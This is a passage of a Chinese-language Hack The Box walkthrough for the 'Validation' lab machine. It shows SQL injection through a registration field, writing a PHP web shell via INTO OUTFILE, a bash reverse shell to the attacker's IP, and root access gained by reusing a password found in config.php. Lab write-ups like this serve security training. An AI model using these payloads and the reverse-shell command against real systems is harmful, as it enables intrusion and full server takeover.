+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">		&lt;h1 class=<span class="string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;section class=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;container p-5&quot;</span>&gt;</span><br><span class="line">            &lt;h1 class=<span class="string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="string">&#x27;union select user()-- &lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;uhc@localhost&lt;/li&gt;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	&lt;/section&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取到当前用户：uhc@localhost。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!------ Include the above <span class="keyword">in</span> your HEAD tag ----------&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">		&lt;h1 class=<span class="string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;section class=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;container p-5&quot;</span>&gt;</span><br><span class="line">            &lt;h1 class=<span class="string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="string">&#x27;union select database()-- &lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;registration&lt;/li&gt;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	&lt;/section&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">* Connection #0 to host validation.htb left intact</span></span><br></pre></td></tr></table></figure>
+
+<p>当前数据库registration:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d <span class="string">&quot;username=hack&amp;country=Brazil&#x27;union select privilege_type FROM information_schema.user_privileges where grantee = \&quot;&#x27;uhc&#x27;@&#x27;localhost&#x27;\&quot;-- -&quot;</span> http://validation.htb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;section class=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;container p-5&quot;</span>&gt;</span><br><span class="line">            &lt;h1 class=<span class="string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="string">&#x27;union select privilege_type FROM information_schema.user_privileges where grantee = &quot;&#x27;</span>uhc<span class="string">&#x27;@&#x27;</span>localhost<span class="string">&#x27;&quot;-- -&lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SELECT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;INSERT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;UPDATE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;DELETE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;DROP&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;RELOAD&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SHUTDOWN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;PROCESS&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;FILE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;REFERENCES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;INDEX&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;ALTER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SHOW DATABASES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SUPER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE TEMPORARY TABLES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;LOCK TABLES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;EXECUTE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;REPLICATION SLAVE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;BINLOG MONITOR&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE VIEW&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SHOW VIEW&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE ROUTINE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;ALTER ROUTINE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE USER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;EVENT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;TRIGGER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CREATE TABLESPACE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;DELETE HISTORY&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SET USER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;FEDERATED ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;CONNECTION ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;READ_ONLY ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;REPLICATION SLAVE ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;REPLICATION MASTER ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;BINLOG ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;BINLOG REPLAY&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="string">&#x27;&gt;SLAVE MONITOR&lt;/li&gt;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	&lt;/section&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">* Connection #0 to host validation.htb left intact</span></span><br></pre></td></tr></table></figure>
+
+<p>我当前的用户权限很多，而且它拥有File权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d <span class="string">&quot;username=hack&amp;country=Belgium&#x27; union select &#x27; can you see me ?&#x27; into outfile &#x27;/var/www/html/test.txt&#x27;-- - &quot;</span> http://validation.htb/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">		&lt;h1 class=<span class="string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;section class=<span class="string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;container p-5&quot;</span>&gt;</span><br><span class="line">            &lt;h1 class=<span class="string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="string">&quot;text-white&quot;</span>&gt;Other Players In Belgium<span class="string">&#x27; union select &#x27;</span> can you see me ?<span class="string">&#x27; into outfile &#x27;</span>/var/www/html/test.txt<span class="string">&#x27;-- - &lt;/h3&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33</span></span><br><span class="line"><span class="string">Stack trace:</span></span><br><span class="line"><span class="string">#0 &#123;main&#125;</span></span><br><span class="line"><span class="string">  thrown in &lt;b&gt;/var/www/html/account.php&lt;/b&gt; on line &lt;b&gt;33&lt;/b&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">* Connection #0 to host validation.htb left intact</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl http://validation.htb/test.txt                                                       </span><br><span class="line"> can you see me ?</span><br><span class="line">                  </span><br></pre></td></tr></table></figure>
+
+<p>我可以写WebShell，符号太多会出错，可进行编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v -d <span class="string">&quot;username=hack&amp;country=Belgium&#x27; union select %22%3C%3Fphp%20SYSTEM(%24_REQUEST%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%3B--%20-&quot;</span> http://validation.htb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl -v --cookie <span class="string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl http://validation.htb/shell.php?cmd=<span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Reverse-shell："><a href="#Reverse-shell：" class="headerlink" title="Reverse shell："></a>Reverse shell：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl http://validation.htb/shell.php --data-urlencode <span class="string">&#x27;cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.10.11.116] 40708</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@validation:/var/www/html$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line">^Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">screen</span><br></pre></td></tr></table></figure>
+
+<p>对用户目录有读取权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@validation:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">account.php  config.php  css  index.php  js  shell.php</span><br><span class="line">www-data@validation:/var/www/html$ <span class="built_in">cd</span> ~</span><br><span class="line">www-data@validation:/var/www$ <span class="built_in">ls</span></span><br><span class="line">html</span><br><span class="line">www-data@validation:/var/www$ <span class="built_in">cd</span> /</span><br><span class="line">www-data@validation:/$ <span class="built_in">cd</span> home/</span><br><span class="line">www-data@validation:/home$ <span class="built_in">ls</span></span><br><span class="line">htb</span><br><span class="line">www-data@validation:/home$ <span class="built_in">cd</span> htb/</span><br><span class="line">www-data@validation:/home/htb$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">www-data@validation:/home/htb$ <span class="built_in">cat</span> user.txt </span><br><span class="line">07..................................</span><br></pre></td></tr></table></figure>
+
+<p>在配置文件里有一串密码，uhc用户会提示不存在，但是尝试密码复用root会成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@validation:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">account.php  config.php  css  index.php  js</span><br><span class="line">www-data@validation:/var/www/html$ <span class="built_in">cat</span> config.php </span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;uhc&quot;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">&quot;uhc-9qual-global-pw&quot;</span>;</span><br><span class="line">  <span class="variable">$dbname</span> = <span class="string">&quot;registration&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">?&gt;</span><br><span class="line">www-data@validation:/var/www/html$ su uhc</span><br><span class="line">su: user uhc does not exist or the user entry does not contain all the required fields</span><br><span class="line">www-data@validation:/var/www/html$ su -</span><br><span class="line">Password: </span><br><span class="line">root@validation:~<span class="comment"># cat /root/root.txt </span></span><br><span class="line">7a..................................</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Validation</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Validation.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Waldo.html" title="HTB Walkthrough - Waldo">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Waldo</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Travel.html" title="HTB Walkthrough - Travel">
+                        <span class="hidden-mobile">HTB Walkthrough - Travel</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
